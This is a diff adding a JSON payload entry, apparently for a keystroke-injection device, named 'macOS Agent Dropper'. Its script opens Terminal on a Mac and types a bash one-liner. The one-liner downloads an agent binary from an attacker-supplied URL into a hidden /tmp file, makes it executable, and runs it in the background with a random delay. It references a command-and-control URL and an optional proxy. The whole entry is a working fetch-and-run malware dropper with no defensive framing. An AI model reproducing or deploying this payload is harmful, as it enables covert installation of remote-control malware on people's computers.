@@ -1,0 +1,7 @@
+{
+  "name": "macOS Agent Dropper",
+  "category": "Persistence",
+  "os": "macOS",
+  "description": "Download, jitter, and background-run DarkBlade agent with optional proxy",
+  "script": "REM macOS Agent Dropper with jitter and proxy\nCMD SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 800\nSTRING bash -lc \"DB_C2=${C2_URL}; DB_JITTER=${JITTER:=30}; DB_SLEEP=${SLEEP:=60}; DB_PROXY=${PROXY:=}; URL=${AGENT_URL}; f=/tmp/.db; curl -fsSL $URL -o $f; chmod +x $f; (sleep $((RANDOM%$DB_JITTER)); nohup $f >/dev/null 2>&1 &)\"\nENTER\n"
+}
